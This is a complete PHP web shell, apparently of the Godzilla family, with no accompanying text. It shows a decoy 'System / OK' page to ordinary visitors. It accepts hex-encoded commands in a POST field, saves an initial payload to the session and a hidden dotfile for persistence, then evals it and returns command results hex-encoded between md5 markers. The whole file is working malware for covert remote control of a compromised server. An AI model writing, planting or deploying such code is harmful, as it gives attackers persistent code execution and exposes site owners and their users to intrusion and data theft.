<?php
@error_reporting(0);@set_time_limit(0);
$_p='pass';
$_k=substr(md5('key'),0,16);
$_sk='nf_1a1dc91c';
$_tf=dirname(__FILE__).DIRECTORY_SEPARATOR.'.nf_1a1dc91c';
if(!function_exists('_nhex')){function _nhex($h){$s='';for($i=0;$i<strlen($h)-1;$i+=2)$s.=chr(hexdec($h[$i].$h[$i+1]));return $s;}}
if(!function_exists('_nenc')){function _nenc($d){return bin2hex($d);}}
if(!isset($_POST['123'])){
  echo '<!DOCTYPE html><html><head><title>System</title><!-- nf:11cd6a87 --></head><body><p>OK</p></body></html>';
  exit;
}
$_raw=_nhex($_POST['123']);
if($_raw===false||strlen($_raw)===0)exit;
$_st=null;
@session_start();
if(isset($_SESSION[$_sk]))$_st=$_SESSION[$_sk];
elseif(@file_exists($_tf))$_st=@file_get_contents($_tf);
if($_st===null){
  if(strlen($_raw)>5000){$_SESSION[$_sk]=$_raw;@file_put_contents($_tf,$_raw);}
}else{
  @eval('/*'.$_p.'*/'.$_st.'');
  echo substr(md5($_p.$_k),0,16);
  echo _nenc(@run($_raw));
  echo substr(md5($_p.$_k),16);
}
?>